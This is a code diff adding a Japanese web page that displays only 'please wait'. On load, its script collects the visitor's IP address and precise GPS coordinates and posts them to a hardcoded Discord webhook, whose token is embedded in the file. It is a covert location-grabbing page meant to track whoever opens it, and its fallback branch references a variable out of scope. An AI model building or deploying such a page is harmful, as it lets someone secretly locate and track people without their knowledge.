@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>GPSとIPアドレスの取得</title>
+</head>
+<body>
+    <h1>少しお待ちください...</h1>
+
+    <script>
+        // ページが読み込まれたときに自動的にIPアドレスとGPS情報を取得
+        window.addEventListener('load', function() {
+            // IPアドレスを取得
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    console.log('IPアドレス:', ipAddress); // IPアドレスをコンソールに出力
+
+                    // GPS情報を取得
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(function(position) {
+                            const latitude = position.coords.latitude;
+                            const longitude = position.coords.longitude;
+
+                            // Discord Webhook URL
+                            const webhookUrl = 'https://discord.com/api/webhooks/1433126145770918068/byGgcCMoD2rsbTS96dFAY9mMr63yCWmw4ipxHBWHFvyZPuCnvYn-ExZ3ZurfZRElb_Qo';
+
+                            // GPS情報とIPアドレスをDiscordに送信
+                            fetch(webhookUrl, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                                body: JSON.stringify({
+                                    content: `IPアドレス: ${ipAddress}, 緯度: ${latitude}, 経度: ${longitude}`
+                                }),
+                            })
+                            .then(response => response.json())
+                            .then(data => {
+                                alert('IPアドレスとGPS情報がDiscordに送信されました');
+                            })
+                            .catch(error => {
+                                console.error('Error sending to Discord:', error);
+                            });
+                        }, function(error) {
+                            console.error('Error getting GPS information:', error);
+                            // GPS情報の取得に失敗した場合でもIPアドレスを送信
+                            fetch(webhookUrl, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                                body: JSON.stringify({
+                                    content: `IPアドレス: ${ipAddress}, GPS情報の取得に失敗`
+                                }),
+                            })
+                            .then(response => response.json())
+                            .then(data => {
+                                alert('IPアドレスがDiscordに送信されました');
+                            })
+                            .catch(error => {
+                                console.error('Error sending IP address to Discord:', error);
+                            });
+                        }, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
+                    } else {
+                        alert('このブラウザでは位置情報がサポートされていません');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                });
+        });
+    </script>
+</body>
+</html>
